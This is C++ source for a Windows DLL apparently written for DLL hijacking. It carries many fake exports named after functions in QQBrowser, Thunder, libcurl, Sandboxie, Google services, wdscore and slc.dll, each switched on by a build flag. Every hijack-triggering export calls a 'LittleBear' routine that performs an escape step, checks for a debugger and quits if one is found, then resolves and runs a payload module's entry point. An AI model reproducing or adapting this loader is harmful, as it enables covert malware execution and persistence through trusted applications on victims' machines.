

#ifdef _WINDLL

#include <windows.h>
#include <iostream>
#include "dbghelp.h"
#include "DllExport.h"
#include "api.h"
#include "Debug.h"
#include "main.h"
#include "escape.h"
#include "api.h"
#include "Debug.h"
#include "MapPE.h"
#include "escape.h"
#include "ImportFunTable.h"
#include "Public.h"
#include "Reloc.h"
#include "FileHelper.h"
#include "Crypto.h"
#include "PEParser.h"

#pragma comment(lib,"dbghelp.lib")

using namespace std;


#define CRYPT_KEY_SIZE 16

int LittleBear() {

	//Public::writelog("function entry\r\n");

	int ret = 0;
	ret = Escape::escape();

	ret = getapi();

#ifndef _DEBUG
	if (Debug::PEB_BegingDebugged())
	{
		Public::writelog("debuggered\r\n");
		return FALSE;
	}
#endif

	typedef int(*LittleBearEntry)();

	char szdllentry[] = { '_','L','i','t','t','l','e','B','e','a','r','@','0',0 };		//"_LittleBear@0"

	LittleBearEntry funcentry = (LittleBearEntry)PEParser::getProcAddr(ghPEModule, szdllentry,lstrlenA(szdllentry));

	Public::writelog("find LittleBear addr:%x\r\n", funcentry);

	funcentry();

	return 0;
}

//dsktptst.dll
extern "C" __declspec(dllexport) void *__stdcall SetCommandLine(void *Src) {
	LittleBear();
	return 0;
}

extern "C" __declspec(dllexport) int __stdcall ShowMessage(int a1) {
	LittleBear();

	//该函数有64个参数难以重写，必须退出才能保证不发生异常
	//ExitProcess(0);
	return 0;
}


#ifdef DLLHIJACK_QQBROWSER
int qqDllFunLoad(string funname,int param) {

	LittleBear();

// 	char szcurfn[MAX_PATH] = { 0 };
// 	int ret = GetModuleFileNameA(lpThisDll, szcurfn, MAX_PATH);
// 	string newfilename = string(szcurfn) + "_old.dll";
// 
// 	HMODULE h = LoadLibraryA(newfilename.c_str());
// 	if (h > 0)
// 	{
// 		if (param)
// 		{
// 			typedef int(*ptrGMBSImpl)(int a1);
// 			ptrGMBSImpl lpGMBSImpl = (ptrGMBSImpl)GetProcAddress(h, funname.c_str());
// 			return lpGMBSImpl(param);
// 		}
// 		else {
// 			typedef int(*ptrGMBSImpl)();
// 			ptrGMBSImpl lpGMBSImpl = (ptrGMBSImpl)GetProcAddress(h, funname.c_str());
// 			return lpGMBSImpl();
// 		}
// 	}

	return 0;
}

extern "C" __declspec(dllexport) int __cdecl GMBSImpl(int a1)
{
	return qqDllFunLoad("GMBSImpl", a1);
	//MessageBoxA(0, "GMBSImpl", "GMBSImpl", MB_OK);
	//return 0;
}

extern "C" __declspec(dllexport) int __cdecl GetMiniBrowserServer(int a1)
{
	return qqDllFunLoad("GetMiniBrowserServer", a1);
	//MessageBoxA(0, "GetMiniBrowserServer", "GetMiniBrowserServer", MB_OK);
	//return 0;
}

extern "C" __declspec(dllexport) signed int Register()
{
	return qqDllFunLoad("Register", 0);
	//MessageBoxA(0, "Register", "Register", MB_OK);
	//return 0;
}

#endif



#ifdef DLLHIJACK_FIRSTLOAD
extern "C" __declspec(dllexport) int __stdcall Launch(char * a1) {
	//MessageBoxA(0, "Launch", "Launch", MB_OK);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) int __stdcall LaunchW(wchar_t * a1) {
	//MessageBoxA(0, "LaunchW", "LaunchW", MB_OK);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) int Launch2(char * a1) {
	//MessageBoxA(0, "Launch2", "Launch2", MB_OK);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) int Launch2W(wchar_t * a1) {
	//MessageBoxA(0, "Launch2W", "Launch2W", MB_OK);
	LittleBear();
	return 0;
}
#endif

#ifdef THUNDER_EXPORT
// extern "C" __declspec(dllexport) int __stdcall TSEGetModule(int *a1){
// 	MainProc();
// 	return 0;
// }
// extern "C" __declspec(dllexport) int __stdcall TSEGetModuleEx(int *a1){
// 	MainProc();
// 	return 0;
// }

extern "C" __declspec(dllexport) int __stdcall ThunderModule_Init(int a1) {
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) void ThunderModule_Uninit() {
	LittleBear();
	return;
}
#endif

#ifdef DLLHIJACK_LIBCURL
extern "C" __declspec(dllexport) void *__stdcall liburl_1(int a1) {
	//MessageBoxA(0, "liburl_1", "liburl_1", MB_OK);
	LittleBear();
	return 0;
}

extern "C" __declspec(dllexport) signed int __stdcall TSEGetModule(int *a1) {
	//MessageBoxA(0, "TSEGetModule", "TSEGetModule", MB_OK);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) signed int __stdcall TSEGetModuleEx(int *a1) {
	//MessageBoxA(0, "TSEGetModuleEx", "TSEGetModuleEx", MB_OK);
	LittleBear();
	return 0;
}

extern "C" __declspec(dllexport) int __cdecl mini_unzip_dll(int a1, int a2) {
	//MessageBoxA(0, "mini_unzip_dll", "mini_unzip_dll", MB_OK);
	LittleBear();
	return 0;
}
#endif

#ifdef DLLHIJACK_LIBCURL
extern "C" __declspec(dllexport) int __cdecl curl_easy_cleanup(int a1)
{
	//MessageBoxA(0, "curl_easy_cleanup", "curl_easy_cleanup", 0);
	return 0;
}

//用VS2005反汇编 固定参数时是callee管理的
//extern "C" __declspec(dllexport) int __thiscall curl_easy_init(void *a1)
//extern "C" __declspec(dllexport) int __stdcall curl_easy_init(void *a1)
extern "C" __declspec(dllexport) int __cdecl curl_easy_init()
{
	LittleBear();
	//MessageBoxA(0, "curl_easy_init", "curl_easy_init", 0);
	return 0;
}

extern "C" __declspec(dllexport) int __cdecl curl_easy_perform(int a1)
{
	//MessageBoxA(0, "curl_easy_perform", "curl_easy_perform", 0);
	return 0;
}

extern "C" __declspec(dllexport) signed int __cdecl curl_easy_setopt(int a1, int a2, char a3)
{
	//MessageBoxA(0, "curl_easy_setopt", "curl_easy_setopt", 0);
	return 0;
}
#endif


#ifdef DLLHIJACK_SBIEDLL
extern "C" __declspec(dllexport) signed int SbieApi_Log()
{
	//MessageBoxA(0,"SbieApi_Log","SbieApi_Log",0);
	LittleBear();
	return TRUE;
}

extern "C" __declspec(dllexport) void __stdcall  SbieDll_Hook(int a1, int a2, int a3)
{
	//MessageBoxA(0,"SbieDll_Hook","SbieDll_Hook",0);
	LittleBear();
	return;
}
#endif


#ifdef DLLHIJACK_GETCURRENTROLLBACK
extern "C" __declspec(dllexport) void  GetCurrentInternal_ReportRollbackEvent()
{
	//MessageBoxA(0,"GetCurrentInternal_ReportRollbackEvent","GetCurrentInternal_ReportRollbackEvent",0);
	LittleBear();
	return;
}
int SetClientVerdict()
{
	MessageBoxA(0,"SetClientVerdict","SetClientVerdict",0);
	LittleBear();
	return  TRUE;
}
#endif

//clover with clover_dll.dll
#ifdef DLLHIJACK_CLOVER
extern "C" __declspec(dllexport) DWORD /*__stdcall*/ CloverMain(void)
{
	//MessageBoxA(0,"CloverMain","CloverMain",0);
	LittleBear();
	return  TRUE;
}
#endif


#ifdef DLLHIJACK_QQMGRDIARY
extern "C" __declspec(dllexport) DWORD  __cdecl DestroyQMNetworkMgr(void)
{
	//MessageBoxA(0,"DestroyQMNetworkMgr","DestroyQMNetworkMgr",MB_OK);
	return 0;
}
extern "C" __declspec(dllexport) void __cdecl CreateQMNetworkMgr(DWORD a1)
{
	//MessageBoxA(0,"CreateQMNetworkMgr","CreateQMNetworkMgr",MB_OK);
	LittleBear();
	return ;
}
#endif


#ifdef DLLHIJACK_GOOGLESERVICE
extern "C" __declspec(dllexport) int  GoogleServices_1(int a1, int a2, int a3, int a4)
{
	LittleBear();
	//MessageBoxA(0,"GoogleServices_1","GoogleServices_1",0);
	return 0;
}
#endif

#ifdef DLLHIJACK_MSOOBE
//all is used in wdscore.dll
extern "C" __declspec(dllexport) VOID * CurrentIP()
{
	return 0;
	//MessageBoxA(0,"CurrentIP","CurrentIP",MB_OK);
}
extern "C" __declspec(dllexport) DWORD   ConstructPartialMsgVA(DWORD a1,char * a2)
{
	//return 0;
	//MessageBoxA(0,"ConstructPartialMsgVA","ConstructPartialMsgVA",MB_OK);
	return 0;
}
extern "C" __declspec(dllexport) char* ConstructPartialMsgVW(DWORD a1,DWORD a2)
{
	//return 0;
	//MessageBoxA(0,"ConstructPartialMsgVW","ConstructPartialMsgVW",MB_OK);
	return 0;
}
extern "C" __declspec(dllexport) DWORD WdsSetupLogDestroy()
{
	//MessageBoxA(0,"WdsSetupLogDestroy","WdsSetupLogDestroy",MB_OK);
	return 0;
}
extern "C" __declspec(dllexport) char *  WdsSetupLogInit(DWORD a1,DWORD a2,wchar_t * a3)
{
	//MessageBoxA(0,"WdsSetupLogInit","WdsSetupLogInit",MB_OK);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) DWORD WdsSetupLogMessageA()
{
	return 0;
	//MessageBoxA(0,"WdsSetupLogMessageA","WdsSetupLogMessageA",MB_OK);
}
extern "C" __declspec(dllexport) DWORD WdsSetupLogMessageW()
{
	return 0;
	//MessageBoxA(0,"WdsSetupLogMessageW","WdsSetupLogMessageW",MB_OK);
}
#endif



#ifdef DLLHIJACK_REKEYWIZ
//rekeywiz.exe //slc.dll
extern "C" __declspec(dllexport) DWORD __cdecl SLGetWindowsInformationDWORD(short * pwstr,DWORD a1)
{
	//MessageBoxA(0,"SLGetWindowsInformationDWORD","SLGetWindowsInformationDWORD",MB_OK);
	LittleBear();
	return TRUE;
}
#endif 



#ifdef DLLHIJACK_91ASSISTUPDATE
extern "C" __declspec(dllexport) void __cdecl initDll(void *a1, int a2, void *a3, void *a4, int a5)
{
	//MessageBoxA(0,"initDll","initDll",0);
	LittleBear();
}
extern "C" __declspec(dllexport) char __cdecl StartDownload(int a1)
{
	//MessageBoxA(0,"StartDownload","StartDownload",0);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) char __cdecl GetLocalFileName(int a1, int a2)
{
	//MessageBoxA(0,"GetLocalFileName","GetLocalFileName",0);
	LittleBear();
	return 0;
}
extern "C" __declspec(dllexport) int __cdecl CreateTask(LPCWSTR lpszUrl, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
	//MessageBoxA(0,"CreateTask","CreateTask",0);
	LittleBear();
	return 0;
}
#endif





















#endif



